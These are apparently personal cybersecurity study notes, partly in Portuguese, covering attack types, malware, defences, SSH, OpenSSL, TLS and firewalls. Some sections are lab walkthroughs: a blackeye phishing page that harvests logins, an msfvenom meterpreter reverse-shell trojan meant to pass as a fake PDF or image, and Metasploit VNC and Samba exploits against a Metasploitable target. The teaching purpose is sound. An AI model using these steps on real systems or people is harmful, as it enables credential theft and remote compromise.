## **Introduction**
---
<span style="color: #d65d0e">Cyber Security</span> allows to protect assets, usually digital assets. That can be private or personal information, to our website or application, to our entire company's data and business plan.

<span style="color: #d65d0e">Black Hat hackers</span> <span style="color: #3588E9">--></span> in digital world, people just waiting to inflict damage to others.

<span style="color: #d65d0e">White Hat hacker</span> <span style="color: #3588E9">--></span> good hackers

<span style="color: #d65d0e">Security Engineers</span> main focus is to implement defense strategies into various types of systems.

<span style="color: #d65d0e">Security Architect</span> <span style="color: #3588E9">--></span> networking and system administration skill are important.

<span style="color: #d65d0e">Security consultant</span> <span style="color: #3588E9">--></span> enhance the company's security by providing recommendations in how to strengthen different security measures.

> The goal of a cyber security expert is to prevent any type of attack from a black hat hacker.

- <span style="color: #d65d0e">Blue Team</span> vs <span style="color: #d65d0e">Red Team</span>:
	- Blue team is a defensive security team that consists of professional responsible for maintaining the defense against all cyber attacks and responsible for creating a security strategy.
	- Red team consists of security professionals who are trained to attack and break into the systems.
	- There is also the <span style="color: #d65d0e">Purple Team</span> which is responsible to bring the read an blue team to work together.
	- The red team's success is essentially measured by blue team's failure.

<span style="color: #d65d0e">Ethical Hacking</span> or <span style="color: #d65d0e">penetration testing</span> <span style="color: #3588E9">--></span> the goal is to discover as vulnerabilities as it can.
- involves knowledge of networking, penetration testing tools and scripting.

<span style="color: #d65d0e">Authentication</span> <span style="color: #3588E9">--></span> process of verifying a user's identity. It means ensuring someone really is whom they claim to be. Example: Using password and username to access a system.

<span style="color: #d65d0e">Authorization</span> <span style="color: #3588E9">--></span> process of giving the user permission to access a specific resource or function (user’s access rights). Authorization ensures that they can do only what they are allowed to do. Example: Giving someone permission to download a particular file on a server.
- Authorized access means they have the correct access right.

- <span style="color: #d65d0e">Encryption</span> <span style="color: #3588E9">--></span> process of encoding information so that only those users with authorized access can decode it.
	- <span style="color: #d79921">Symmetric encryption</span> is when the same key is used for both encrypting and decrypting.
	- <span style="color: #d79921">Asymmetric encryption</span> is when different keys are used to encrypt and decrypt

<span style="color: #d65d0e">Integrity</span> is the process of ensuring that data hasn’t been changed by an unauthenticated source. It means you can trust the data that you are reading. Ex: use secure hash algorithms.

<span style="color: #d65d0e">Payload</span> <span style="color: #3588E9">--></span> piece of software dropped on the target machine and is used to compromise it.

<span style="color: #d65d0e">Asset</span> <span style="color: #3588E9">--></span> can be the most valuable thing that a company of a person has. But it varies according to each company. Examples: important files, main servers, hard drives(physical asset), personal information.

<span style="color: #d65d0e">Phishing attacks</span> target people by tricking them into submitting private information into a fake page, or it can also trick them to download a piece of software or a <span style="color:#c6554f">trojan</span> that will then infect their device.

A <span style="color:#c6554f">security breach</span> is a company's data or company's devices getting compromised.

The main goal of an <span style="color: #98971a">incident responder</span> is to monitor company's network and devices, and also be able to stop the breach.
###### <strong style="color: #689d6a">Goals of Cyber Security</strong>

Confidentiality <span style="color: #3588E9">--></span> keep the sensitive data private and accessible to only authorized users.
 
 Integrity <span style="color: #3588E9">--></span> ensure that even if the data is being transferred between the right endpoints after successful authorization, it must not be altered with in the transmission.

Availability <span style="color: #3588E9">--></span> the data must be easily accessible to people who must access it.
###### <strong style="color: #689d6a">Types of vulnerabilities:</strong>

<span style="color:#c6554f">unpatched vulnerabilities</span> <span style="color: #3588E9">--></span> service or software that didn't receive latest updated or patches.

<span style="color:#c6554f">zero day vulnerability</span> <span style="color: #3588E9">--></span> is a vulnerability that wasn't discovered yet or no it has a patch available for it.

<span style="color:#c6554f">weak credentials</span>
###### <strong style="color: #689d6a">Ways to attack</strong>

<span style="color:#c6554f">Social engineering</span>. Example: <span style="color:#c6554f">phishing</span> <span style="color: #3588E9">--></span> focus on exploit people, it tricks people to do something that they should not do. It can be something like clone a company's page and send it to an employee to log in.

<span style="color:#c6554f">Malware</span> <span style="color: #3588E9">--></span> short word for malicious software. It's main goal is to compromise confidentiality, integrity and availability of the system that they are targeting.

<span style="color:#c6554f">DDos (Distributed Denial of Service)</span> <span style="color: #3588E9">--></span> Visa sobrecarregar e derrrubar um servidor, serviço ou rede, enviando mais tráfego do que o sistema pode suportar. É realizado através do uso de uma rede de computadores infectados (botnet) para inundar o alvo com solicitações de dados.

<span style="color:#c6554f">Brute Force Attacks</span> <span style="color: #3588E9">--></span> o ataque de força bruta envolve tentativas sistemáticas e repetitivas para adivinhar a senha de um usuário ou a chave de criptografia de um sistema. O atacante tenta muitas combinações possíveis de senha ou chaves até encontrar a correta. São menos comuns, mas funcionam se a senha é fraca.

<span style="color:#c6554f">Key Logger</span> <span style="color: #3588E9">--></span> It's the least common way, but does happen, especially in target attacks. The system is infected with a keylogger when a malware is downloaded and run. The keylogger would then capture every keystroke that the user inputs in the keyboard, including all of usernames and passwords.

<span style="color:#c6554f">Man-in-the-Middle (MitM)</span> <span style="color: #3588E9">--></span> o invasor intercepta a comunicação entre duas partes, geralmente sem o conhecimento delas. O atacante pode interceptar, alterar ou fabricar mensagens entre as duas partes. Isso é comum em redes não seguras, como Wi-Fi público.

<span style="color:#c6554f">SQL Injection</span> <span style="color: #3588E9">--></span> An attack that passes a string input to exploit a database. Esse ataque pode permitir ao atacante visualizar, modificar ou excluir dados do banco de dados. Ex: In a SQL injection, the attacker modifies a SQL statement using set operations, or they they alter the WHERE clause to return alternate results.
- <strong style="color:#d79921">Types of SQL injections</strong>
	- <span style="color:#c6554f">SQL manipulation</span> <span style="color: #3588E9">--></span> attack that modifies a SQL statement using set operators or by altering WHERE clauses or UNION operators. Often, a SQL manipulation attack modifies a WHERE clause of user authentication to always result in TRUE.
	- <span style="color:#c6554f">Code injection</span> <span style="color: #3588E9">--></span> attack that inserts new SQL statements or database commands into another SQL statement, causing them to execute as one.
		- In a code injection attack, the attacker can delete a table or a whole database
	- <span style="color:#c6554f">Function call injection</span> <span style="color: #3588E9">--></span> attack that inserts a custom function into a vulnerable SQL statement allowing them to perform unauthorized changes, transactions, or potentially compromising remote computers.
		- Sending data from a database to a remote computer
		- Changing passwords
		- Performing senstive database transactions
	- <span style="color:#c6554f">Buffer overflow</span> <span style="color: #3588E9">--></span> when a program allocates more data in a buffer than possible to store.
		- It causes a system or a program to crash or execute malicius code
		- Can exploit an unpatched database with functions such as: tz_offset, to_timestamp_tz, bfilename.
	- <strong style="font-weight: 600">Preventions:</strong>
		- Use query parameters as placeholders to create dynamic statements. Ex: <code style="color: #98971a">"SELECT * FROM Users WHERE userid = ?;"</code>
		- Use server-side validation
		- Restrict user privileges
		- Perform dynamic application security testing (DAST)

<span style="color:#c6554f">Cross Site Scripting</span> <span style="color: #3588E9">--></span> is when an application takes untrusted data and then sends it to a web browser without proper validation or escaping. Attackers use cross-site scripting to execute scripts in the victim’s browser.
- cross-site scripting can enable attackers to hijack user sessions.
- a cross-site scripting attack can deface websites by replacing or removing images or content.
- it can redirect users from a trusted website to a malicious website.
- <strong style="color:#d79921">Types of attacks</strong>
	- Stored --> injects a script that becomes permanently stored in a database or a targeted server. When a victim retrieves the malicious script, it requests information stored on the server. Is also referred to as persistent cross-site scripting.
	- Blind --> injects a script that has a payload to be executed on the backend of an application by the user or the administrator without their knowing about it. The payload may compromise the application or the server. It may even attack the user.
	- Reflected --> injects a script to be reflected from the attacked server to users on a system. Example: delivering phishing email messages with malicious links that can compromise many victims.
- <strong style="font-weight: 600">Preventions:</strong>
	- Looks for suspicious HTTP requests or keywords
	- Escape suspect lists of keywords, or block special characters
	- Turn off HTTP TRACE support on a web server
	- Avoid using unsafe sinks by refactoring or by using textContent or values
###### <strong style="color: #689d6a">Types of malware</strong>

<span style="color:#c6554f">trojan</span> <span style="color: #3588E9">--></span> is a malware that relies on social engineering. It represents as one thing or one type of a file, while in reality it's something else completely different. Can appear as an image, PDF file, etc. Once it's executed by the target, it can steal the data on that system, run different programs, set itself to be as a backdoor for any future connection.

<span style="color:#c6554f">worms</span> <span style="color: #3588E9">--></span> it exploits unpatched vulnerabilities. A Worm provides its own delivery mechanism so that it can actually automatically spread from system to system.

<span style="color:#c6554f">ransomware</span> <span style="color: #3588E9">--></span> is simply a malicious program that when executed on the system, encrypts all of the data and asks for for money in order to decrypt that data.

<span style="color:#c6554f">virus</span> <span style="color: #3588E9">--></span> self-replicating file infectors.

<span style="color:#c6554f">rootkit</span> <span style="color: #3588E9">--></span> is a malicious program designed to give unauthorized access to a system or a software. Rootkits are hidden deep inside the operating system and they can be can commonly be very very hard to remove.

<span style="color:#c6554f">spyware</span> <span style="color: #3588E9">--></span> is a program that is used to spy on us. Sometimes it's even combined with a adware.
###### <strong style="color: #689d6a">Common Attacks Example</strong>

- <strong style="color:#d79921">Phishing Attack</strong>
	- it will be done using the tool <span style="color:#98971a">blackeye -v.2</span>
	- run the tool
		- `sudo bash blackeye.sh`
	- choose a whebsite - it creates a fake page
		- `type number 1`
	- visit the link
		- `localhost:3333/login.html`
	- --> after log in on the app it will show all the data on the terminal
---
- <strong style="color:#d79921">Infect target with a Trojan</strong>
	- use msfvenom to create the payload(meterpreter)
	- --> reverse_tcp is a reverse shell
	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST-192.168.0.2 LPORT=4444 --platform windows -f exe >> shell.exe`
	- --> the shell.exe can be tranfered into fake pdf file, fake image or any type of file
	- `# to run the file a listener must be created`
	  `# a listener is just something that will listen for the incoming connections`
	- `$ msfconsole`
	- `# set up the listener`
		- `set payload windows/meterpreter/reverse_tcp`
		- `set LHOST 192.168.0.2`
		- `> set LPORT 4444`
		- `> run # it will listen for the incoming connections`
		- `meterpreter > getuid`
		  `meterpreter > getuid`
		  `meterpreter > getuid`
	- `# enter a shell`
		- `meterpreter > shell`
	- `# do a screenshot of the target machine`
		- `meterpreter > screenshot`
## **Security Bugs**
---
If the software is hosted on an open port then it is also open for possible attacks from the outside.

Problem occurs if the code of a software is not well written, if it has some bugs

<span style="color:#c6554f">Exploitable vulnerability</span> <span style="color: #3588E9">--></span> when the hacker use a bug to make software act in a way that it is not intended to.

People are always the weakest spot!!

<span style="color:#c6554f">Buffer overflow vulnerability</span> <span style="color: #3588E9">--></span> anomaly where, while writing data to the buffer, it overruns the buffer size and overwrites the memory addresses.
###### <strong style="color: #689d6a">Common vulnerabilities</strong>

- <strong style="color: #d79921">Software Vulnerabilities</strong>
	- <span style="color:#c6554f">Zero Day Vulnerabilities</span> <span style="color: #3588E9">--></span> It's the most dangerous, it is a vulnerability that has not been discovered yet and not patched.
	- <span style="color:#c6554f">Owasp Top 10</span> <span style="color: #3588E9">--></span> Should be apply for any web application security, it includes SQL injection, command injection, cross-site scripting attacks where JavaScript is injected into unscientized user input, broken access control access. These vulnerabilities usually occur when user input is not well filtered or misconfiguration in the application.
	- <span style="color:#c6554f">Misconfigurations</span> <span style="color: #3588E9">--></span> Something that is not configured right or implemented right They're also common in access control types of configurations and cant occur anywhere.
	- <span style="color:#c6554f">Outdated Software</span> <span style="color: #3588E9">--></span> It's important to patch every code and library when a bud is found
	- <span style="color:#c6554f">MiiM & DDoS</span> <span style="color: #3588E9">--></span> The man-in-the-middle attack allows the attacker to do is sniff other's traffic on the network.
	- <span style="color: #3588E9">--></span> <strong style="color: #d79921">Always check the code where user input can be provided</strong> 
---
- <strong style="color: #d79921">Human vulnerabitlites</strong>
	- <span style="color:#c6554f">Social Engineering Attacks</span>
	- <span style="color:#c6554f">Phishing Attacks</span>
	- <span style="color:#c6554f">Downloading Unwanted Software</span>
	- <span style="color:#c6554f">Opening Unverified Emails</span> <span style="color: #3588E9">--></span> it means opening email that appear to be coming from the trusted source but it reality they are not to be trusted at all.
	- <span style="color:#c6554f">Clicking on Random Links</span>
	- <span style="color: #3588E9">--></span> <strong style="color: #d79921">All of these can result into not only the employee of the company being compromised but the entire company as well</strong>
	- <span style="color: #3588E9">--></span> <span style="color: #98971a">Zero Trust Model --></span> <strong>None</strong> is to be trusted and we can expect a threat to come from anywhere 
###### <strong style="color: #689d6a">Unpatched Machine Exploitation</strong>

Exploit target system that has an unpatched vulnerability <span style="color: #3588E9">--></span> use the <span style="color: #98971a">Metasploitable</span>

```bash
# Map the machine IP address - simple scan
nmap -sV -F 192.168.0.38

# use msfconsole to launch the exploit
msfconsole

# use the vnc module to log in
msf6 > use auxiliary/scanner/vnc/vnc_login
> show options
> set RHOSTS 192.168.0.38
> run 
> remmina # use the remmina app to access the target system

# another example - choose a different service: samba
# search for the version on the web
Samba smbd 3.x - 4.x

# exploit samba
> use exploit/multi/samba/usermap_script
> show info # to read more about the exploit
> show options
> set RHOSTS 192.168.0.38
> run

# type some commands
whomai
ifconfig
```
###### <strong style="color: #689d6a">To prevent vulnerabilities:</strong>

<span style="color: #3588E9">--></span> <strong style="color: #d79921">Always patch and update everything on the machine</strong>, which include apps, operating systems and browsers. It's also important to install an antivirus software and set up a firewall.

<span style="color: #98971a">Firewall</span> can filter all the incoming and outgoing traffic on the machine or network, and it can also notice if some request might be malicious.

Share common attack knowledge with the employees, like recognize phishing attack, not to input any important data on an untrusted application or website, not plugging in unknown USB device into an important system.

Developers should be introduced to the vulnerabilities, test every application in production for bugs, filter user input of the application, don't apply higher privileges on the system.

User input is where 99% of the attacks can come from.

Application should be able to process any kind of input and not crash or act it's not supposed to act.

There is no need for parts of the application to run with root privileges if it does not require root privileges at all.
## **Social Engineering**
---
lorem ipsum
## **End-Point Protection**
---
<span style="color: #d65d0e">Endpoint Security</span> it is security on the endpoints of the network, it focus on the devices that are connected to the internet.

<span style="color: #3588E9">--></span> <strong style="color:#d79921">Always update the browser!!</strong>

<span style="color: #d65d0e">Endpoint Detection and Response (EDR)</span> <span style="color: #3588E9">--></span> can be described as a layer of protection that constantly monitors and collects data that might indicate a threat on an endpoint device. They do this by analyzing the data for specific pattern that will indicate a possible threat.

Antiviruses can usually be a part of larger EDR system. Big companies also have endpoint detection and prevention systems as a layer of protection against malware.

Antivirus is there to protect and EDR is there detect and respond.

Some advanced antivirus software will also perform code analysis when it comes to unknown executable that could be a threat.

- <strong style="color: #689d6a">Ways that antivirus detect and prevent:</strong>
	- <span style="color: #d65d0e">signature based detection</span> <span style="color: #3588E9">--></span> antivirus vendors have a large database with all the known malware signatures. (oldest way)
	- <span style="color: #d65d0e">heuristic analysis</span> <span style="color: #3588E9">--></span> designed to spot an unknown malware. It analyzes the code of the program and with different rules set, it determines whether that program could be malicious or not.
	- <span style="color: #d65d0e">sandbox detections</span> <span style="color: #3588E9">--></span> refers to testing and analyzing the malware in a safe an isolated environment to see the code's behavior without putting the host machines at the risk.
	- <span style="color: #d65d0e">detecting behavior</span> <span style="color: #3588E9">--></span> detect any type of weird behavior. If the malware tries to accessing folder or files that it shouldn't or tries coping itself to system locations on the machine, it can be stopped and detected.

To avoid a brute force attack just create a strong password what is highly unlikely to be in any major password lists that hacker use when brute forcing

There two important factors while creating strong passwords: how many characters does it has, and which characters the password has

Weak passwords has recognizable word, not too many characters and only lower case letters

<span style="color: #98971a">Secretes Management</span> <span style="color: #3588E9">--></span> Storing and managing any items that must be kept secret. Examples of secrets are passwords, certificates, and application programming interface (or API) encryption keys --> these assets can be stored using a secrets management solution to manage and integrate with applications and databases.

<span style="color: #98971a">Password Managers</span> <span style="color: #3588E9">--></span> software applications used to safely store credentials for various online accounts. They can generate highly secure passwords, encrypt them and store in a safe place.

- <span style="color: #98971a">Vault</span> <span style="color: #3588E9">--></span> Token-based secret storage solution by Hashicorp. To access Vault, the user is assigned a token or creates their own token.
	- Provides policies that constrain user access and privileges when users interact with a Vault server
	- <strong style="color: #d79921">Stages of security</strong>
		- Authenticate ---> Validate ---> Authorize ---> Access
	- <strong style="font-weight: 600">Benefits:</strong>
		- key management centralizes management of cryptographic keys
		- data encryption provides encryption as a service (EaaS)
		- database credential rotation improves security
		- secrets management helps manage and store secrets

<span style="color: #98971a">rkhunter</span>  <span style="color: #3588E9">--></span> tool to check for malware and rootkit in Linux systems. It's good to run it twice a week.
- `sudo apt install rkhunter` --> install on debian base distros
- `sudo rkhunter -c` --> run it

<span style="color: #98971a">host based firewalls</span> <span style="color: #3588E9">--></span> run on an endpoint device, it's purpose is to simply filter the network traffic. In case other devices are trying to endpoint device, the firewall can decide, whose packets can pass through and whose packets are not allowed to go through.

The rules on the firewall that will determine who can or who can't access certain services on the system are added manually.

- <span style="color: #98971a">Iptables</span> <span style="color: #3588E9">--></span> mainly Linux firewall. It's consisted of different types of tables: <span style="color: #689d6a">filter</span>, <span style="color: #689d6a">NAT</span> and <span style="color: #689d6a">mangle table</span>.
	- <span style="color: #689d6a">filter</span> <span style="color: #3588E9">--></span> is refer as firewall, it's responsible for filtering, outgoing, and incoming traffic. It has different chains: input, output and forward. Each of them will process their own packets.
	- <span style="color: #689d6a">NAT</span> <span style="color: #3588E9">--></span> used to redirect any connection to a different interface, or it can also be used in address translation.
	- <span style="color: #689d6a">mangle</span> <span style="color: #3588E9">--></span> used for special purpose processing of different packets.
	```bash
	#show iftables version
	sudo iftables
	
	#to output the help menu
	sudo iptables --help
	
	#to flush(remove) all the existing rules
	sudo iptables -F
	
	#to check the current rules
	sudo iptables -L # only output the filter table
	
	#to drop all request of the input chain
	sudo iptables --policy INPUT DROP
	
	#set the rule for only one device
	sudo iptables -I INPUT -s <source_IP> -j DROP
	
	#set the rule for a specific port
	sudo iptables - INPUT -p tcp --dport 80 -j DROP
	
	#to open the manual
	man iptables
	
	#to save the rules
	sudo /sbin/iptables-save
	```
## **Cryptography**
---
The implementation of <span style="color: #d65d0e">Cryptography</span>, <strong style="color:#d79921">can eliminate the potential</strong> for <span style="color:#c6554f">snooping</span> or <span style="color:#c6554f">eavesdropping</span> by bad actors. In addition, other network attacks such as <span style="color:#c6554f">Spoofing</span> and <span style="color:#c6554f">Hijacking</span>, can be stopped.

<span style="color: #3588E9">--></span> Cryptography is achieved by using multiple encryption methods.
###### <strong style="color:#689d6a">Cryptography service</strong>

Is a confidentailly service that keeps data secret. It offers security without the necessary credentials, even in a non-secure network

<span style="color: #98971a">Cryptographic keys</span> <span style="color: #3588E9">--></span> are the tools that can be used to keep data confidential from cyber attacks. Data remains encrypted, ensuring the confidentialiaty of user information.

<span style="color: #d65d0e">Integraty</span> <span style="color: #3588E9">--></span> guaranttes tha data has not been modofied or tampered with during and after the reception. Ex: file checksum is one method to verify that the downloaded file is the same as the one available online.
- supports the anti-tampering of data between sender and receiver
###### <strong style="color:#689d6a">Message Digest algtorithms</strong>

Is a cryptographic hash function used to compute checksums of data blocks. Message digest can also be used to sign and verify signagures.

It verifies a signature by simple running the reverse of the command when signing

A ciptografia pode ser feita através de dois tipos de algoritmos: MD5 e SHA-1. 

> Note: um hash gerado com a mesma função a partir da mesma senha, terá sempre o mesmo hash.

- <span style="color: #98971a">MD5</span>
	- resumo de mensagen de 128bits
	- documentação RFC-1321
---
- <span style="color: #98971a">SHA-1</span>
	- resumo de mensagem de 160bits
	- padrão no EUA

registro da senha: senha original <span style="color: #3588E9">--></span> Função Hash (MD5) <span style="color: #3588E9">--></span> Hash da senha original <span style="color: #3588E9">--></span> Base de usuários

verificação da senha: senha original <span style="color: #3588E9">--></span> Função Hash (MD5) <span style="color: #3588E9">--></span> Hash da senha original <span style="color: #3588E9">--></span> comparação de hashs
###### <strong style="color:#689d6a">Public Key</strong>

 It's a public cryptographic algorithm that uses public and private keys. Most popular implemetation is Shamir and Adleman (RSA), which provides secrecy, authentication, and encryption for anyone to use.

it can also be used to implement prime number generation to generate private keys using different sizes of key lenghts

- <span style="color: #d65d0e">PKA (Public Key Authenticaion)</span> is an authentication method that uses a key pair for authentication instead of password which is the default method <span style="color: #3588E9">--></span> it increases security.
	- <span style="color: #98971a">private key</span> <span style="color: #3588E9">--></span> used to encript and decript mesages> it says on the SSH client.
	- <span style="color: #98971a">public key</span> <span style="color: #3588E9">--></span> transfer a copy of the public key to the SSH Server. It says on the SSH Server.
	- <strong style="color:#c6554f">Configuration</strong>
		- <code style="color: #689d6a">cat ~/.ssh.id_rsa.pub</code>
		- <code style="color: #689d6a">scp -p 22 ~/.ssh/id_rsa.pub user@IP:~</code>
		- <code style="color: #689d6a">cat id_rsa.pub >> ~/.ssh/authorized_keys</code> <span style="color: #3588E9">--></span> copy the pka to the server
		- <code style="color: #689d6a">ssh-copy-id -i ~/.ssh/id_rsa.pub user@IP </code> <span style="color: #3588E9">--></span> alternative way
		- <code style="color: #689d6a">chmod 400 ~/.ssh/id_rsa.pub</code>
		- <code style="color: #689d6a">nano /etc/ssh/sshd_config</code>
			- change PasswordAuthenticaion to no
		- <code style="color: #689d6a">systemctl restart ssh</code>
	- <strong style="color:#d79921">Commads:</strong>
		- <code style="color: #689d6a">ssh-keygen -b 2048 -t rsa -C "linux user"</code>
		- <code style="color: #689d6a">-b</code> <span style="color: #3588E9">--></span> specifies the number of bits in the key to create
		- <code style="color: #689d6a">-t</code> <span style="color: #3588E9">--></span> specifies the type of key to create
		- <code style="color: #689d6a">-C</code> <span style="color: #3588E9">--></span> specifies a comment
###### <strong style="color:#689d6a">OpenSSL</strong>

Is a <strong style="color: #b16286">library of software that implements SSL protocol</strong>. It's an open-source toolkit to ensure secure communication with cryptography for all types of communication (personal, comercial and e-commerce transcations)

The library of software contains symmetric and public key cryptography, message digests, and hash algorithms

OpenSSL also includes a pseudorandom number generator and manages key material and common certificate formats

A strong cryptography can be provided to programs by including the OpenSSL library. OpenSSL can also be used directly from the command line after installing it on a local computer.

The command line tool offers numerous options, and a configuration file is available to set configurations as defaults to better tailor to your specific requirements.
- The OpenSSL command can be runed directly by running OpenSSL on Linux or Mac or OpenSSL.exe on Windows.

Also supports symmetric ciphers allowing encrypted messages to use the same key

Each cipher has its own algorithm.

<span style="color: #d65d0e">aes-256-cbc</span> is one of the older and simpler ciphers, and there are now much better algorithms to encrypt the data.

- <strong style="color:#d79921">Commads:</strong>
	- <code style="color: #689d6a">openssl aes-256-cbc -d -a -pbkdf2 -in encrypted_secretfile -out secrets.txt</code>
		- <code style="color: #689d6a">aes-256-cbc</code> <span style="color: #3588E9">--></span> The cipher algorithm
		- <code style="color: #689d6a">-d</code> <span style="color: #3588E9">--></span> Decrypt
		- <code style="color: #689d6a">-a</code> <span style="color: #3588E9">--></span> Base64 decode
		- <code style="color: #689d6a">-pbkdf2</code> <span style="color: #3588E9">--></span> Use password-based key derivation function
		- <code style="color: #689d6a">-iter</code> <span style="color: #3588E9">--></span> to set iterations
		- <code style="color: #689d6a">-in</code> <span style="color: #3588E9">--></span> to input file
		- <code style="color: #689d6a">-on</code> <span style="color: #3588E9">--></span> to ouput file
	- <code style="color: #689d6a">openssl enc --list</code> <span style="color: #3588E9">--></span> list available cipher algorithms
## **Network Security**
---
<span style="color: #d65d0e">Network Firewalls</span> does the same thing as host based, but on a network level. It inspects packets and decides which packets are allowed to go in or out of the network. These type of firewalls will be found in larger companies since they do need multiple layers of protection.

<span style="color: #d65d0e">Network Scanning</span> is the first step to secure a network. The goal is to discover any issues or vulnerabilities inside the network, no matter what that might be.
1. find out which IP addresses are active and the perform a port scan.
2. discovering services that are running on those open ports.
3.  find out what software and what version of software is that service using, which can use that information to find out whether it has any known vulnerabilities or issues.
4. see whether there is any malicious traffic inside the network that already exists, or whether certain attacks such as man-in-the-middle attack are possible and if they are taking place at any time.
5. check the overall security of the network

The command <code style="color:#689d6a">netstat -nr</code> can be used to check out the IP address of the gateway, which is probably the IP address of the router.

- <strong style="color:#d79921">TLS/SSL</strong> <span style="color: #3588E9">--></span> <strong style="color: #b16286">protocols for stablish secure connections</strong> betweeen network computers, specifically a server and a client.
	- <span style="color: #d65d0e">secure</span> <span style="color: #3588E9">--></span> protecting data sent over the internet
	- provide security between web browsers and servers,
	- TSL is the successsor to SSL
	- <span style="color: #d65d0e">SSL or TLS/SSL</span> <span style="color: #3588E9">--></span> <strong style="color:#d79921">Modern TLS</strong>
	- <strong style="color:#d79921">Modern TSL</strong> use four steps to ensure TLS security in SDLC
		- Step 1: 
			- computers must agree on the TLS version
			- choose the highest supported version
			- if version is not supoorted, the process fails
		- Step 2:
			- Computer must agree on a supported cipher
			- Cipher defines information ecryption between the server and the client
		- Step 3:
			- client verifies server's identity
			- uses server's public key and tls certificate signature
		- Step 4:
			- Computers generate session keys using their certificate's public and private keys.
			- The key are later used in the cipher chosen in Step 2
	- <strong style="font-weight: 600">Ensure TLS security</strong>
		- Component 1: CI/CD to renew TLS certificates before expire
			- cerificates experie every one to two years
			- renew earlier
		- Component 2: Keep application TLS version updated
			- prefer robust, but avoid vulnerable ciphers
			- drop outdated versions of TLS
###### <strong style="color:#689d6a">Security Layers</strong>

- <span style="color: #98971a">Web application layer</span>
	- <strong>Front-End Layer</strong>
		- consists of JavaScript, CSS, and HTML code running in web browsers.
	- <strong>Backend Layer</strong>
		- consists of databases that provide data to the frontend
	- <strong>Middle Layer</strong>
		- conects the frontend and the backend by using an API
	- <span style="color: #3588E9">--></span> <strong style="color:#c6554f">Obs:</strong> Test all the layers
		- Run vulnerabilty scanners
		- Run tests
		- Adutit web application (before deploying to prod)
---
- <span style="color: #98971a">Cloud layer</span>
	- don't include administrator credentials when developing applications to connect to Cloud-based databases
	- create security groups to restrict access to certain cloud resources
	- secure code to implement two-facor authentication for all users of web apps
	- include strong authentication to avoid unrestricted intrusion
	- <strong style="font-weight: 600">Secure Cloud assets</strong>
		- configure IAM for securing cloud assets --> use IAM roles to grant permissions
		- store passwords, certificates, and enryption keys in secret storage services
---
- <span style="color: #98971a">Communication layer</span>
	- manage using SSH, HTTPS, secure Sockets Layer, and Transport Layer Security, or SSL/TSL.
	- <span style="color: #d65d0e">Secure Shell (SSH)</span> <span style="color: #3588E9">--></span> network protocol used by system admins to securerely configure a remote system over a unsecure network connection. In other words, it's a connection protection for connecting with remote devices
		- <span style="color: #98971a">sshd</span> is the SSH Server (daemon) and ssh or putty is the client.
		- <span style="color: #3588E9">--></span> SSH involves a client and a server. The ssh client create a secure connection to the ssh server on a remote machine.
		- <Strong style="color:#c6554f">Workflow:</strong>
			- Install
				- <code style="color: #98971a">sudo apt install openssh-server openssh-client</code>
			- Configure
				- <code style="color: #98971a">sudo ufw allow ssh</code> <span style="color: #3588E9">--></span> allow incoming connections
				- <code style="color: #98971a">sudo systemctl status sshd</code>
				- <code style="color: #98971a">sudo systemctl is-enable ssh</code> <span style="color: #3588E9">--></span> check if its enable
				- <code style="color: #98971a">sudo systemctl enable ssh</code>
		- <strong style="color:#d79921">Commads:</strong>
			- <code style="color: #98971a">ssh [username]@[IP_address]</code>
				- <code style="color: #98971a">-l</code> <span style="color: #3588E9">--></span> option to specify the username
				- <code style="color: #98971a">-v</code> <span style="color: #3588E9">--></span> for verbose mode, it prints debug messages
			- <code style="color: #98971a">sudo tail -f /var/auth.log</code> <span style="color: #3588E9">--></span> check the server's log
	- <span style="color: #d65d0e">SSL</span> <span style="color: #3588E9">--></span> necessary technologies for securing connections between clients and servers.
	- Data transferred over secure connections with SSL and TLS, guarantee that hackers attempting man-in-the-middle attacks do not intercept communications
---
- <span style="color: #98971a">Delivery pipeline layer</span>
	- secure and the pipeline layer when committing code to an application project
	- lock down the code repository in GitHub with specific permissions
	- conduct and audit periodically
	- authenticate the third parties with a two-factor authentication
---
- <span style="color: #98971a">Loggin systems</span>
	- collect log messages for identifiynd anu anomalies
	- <span style="color:#c6554f">anomalies</span> <span style="color: #3588E9">--></span> unique and unexpected events occuring within an application system. Ex: attempt to log in as an administrator of a system without the necessary credentials.
	- provide access to only trusted people reviewing and analyzing.
---
- <span style="color: #98971a">Intrusion detection</span>
	- it's the ongoing detection on any ayberattacks, threas, and intrusions.
	- <strong style="font-weight: 600">methods of intrusion detection:</strong>
		- <span style="color: #d65d0e">EndPoint security</span> --> protect systems, servers, and various types of devices connected to a network
		- <span style="color: #d65d0e">Network security</span> --> is monitoring a network using a network tool such as Nmap and Snort
		- <span style="color: #d65d0e">System-call auditing</span> --> is the retrieval and review of system call information from a kernel such as the Linux kernel
###### <strong style="color:#689d6a">Security Patterns</strong>

Is a <strong style="color:#d79921">set of rules</strong> that represent and define a reusable solution to recurring security threats or issues.

Documents a security threat or issue

Establish how security

- <strong style="font-weight: 600">Objectives</strong>
	- Reduce or elimiate failure security threats
	- Replace directly relate to a specific threat
	- Develop new security patterns for new threats
	- Illustrate security patterns using diagrams or software design. Ex: UML.
		- the actual software code <span style="color: #3588E9">--></span> analyze and assess the impact on the overall security system
---
- <strong style="font-weight: 600">Structure</strong>
	- its design must be asset-, service- or process centric
	- should analyze and model the threats to provide steps and processes for developers
	- trace threat model back to security to promote reusability
	- standardize taxonomy for traceability and reusability

Security patters <strong style="color:#d79921">classification</strong>: Authentication, Access control, Filtering network traffic, Authorization, Rolebased acces control, Firewalls, Web services security (SAML, XACML, XML firewall).

Documentation makes the security patterns more usable.

<span style="color: #3588E9">--></span> <strong style="color: #c6554f">Obs:</strong> The more usable and applicable the security pattern, the lesser is the optential for unnecessay coding.

Overall, security patterns provide a comprehensive framework for addressing unique security challenges, safeguarding customer information, and ensuring the organization's ecosystem integrity.
###### <strong style="color:#689d6a">Types of firewalls</strong>

<span style="color: #98971a">Packet Filtering Firewall</span> <span style="color: #3588E9">--></span> is used to filter different packets by certain rules that are set.

<span style="color: #98971a">Stateful Inspection Firewalls</span> <span style="color: #3588E9">--></span> can detect attempts by unauthorized individuals to access a network as well as analyze the data whiting packets to see if they contain malicious code. The signature sign of a `stateful firewall` is that it is a kind of firewall that keeps track and monitors the state of active network connections while analyzing incoming traffic and looking for potential traffic and data risks.

<span style="color: #98971a">Application Layer Firewalls</span> <span style="color: #3588E9">--></span> are firewall that essentially focus on traffic that is coming or going from a certain service or application. Most common ones are web applications firewalls which can inspect for certain attacks such as XSS or SQL injection attacks, and this firewall monitors and block certain HTTP traffic coming to the web application.

